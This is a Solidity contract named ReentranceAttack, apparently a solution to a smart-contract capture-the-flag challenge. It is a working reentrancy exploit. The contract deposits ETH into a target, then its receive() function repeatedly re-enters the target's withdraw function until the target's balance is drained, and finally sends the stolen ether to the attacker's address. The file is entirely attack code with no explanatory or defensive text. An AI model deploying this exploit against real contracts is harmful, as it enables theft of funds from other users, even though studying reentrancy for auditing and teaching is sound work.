// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IContract {
    function donate(address _to) external payable;

    function withdraw(uint _amount) external;

    function balanceOf(address _who) external view returns (uint balance);
}

contract ReentranceAttack {
    IContract reentrance;

    address owner;

    constructor(address _to) payable {
        reentrance = IContract(_to);
        owner = msg.sender;

        reentrance.donate{value: msg.value}(address(this));
    }

    function attack() external {
        require(msg.sender == owner);

        reentrance.withdraw(reentrance.balanceOf(address(this)));
    }

    receive() external payable {
        if (address(reentrance).balance >= 1) {
            reentrance.withdraw(reentrance.balanceOf(address(this)));
        } else {
            (bool s, ) = payable(owner).call{value: address(this).balance}("");
            require(s, "ETH tranfer failed");
        }
    }
}
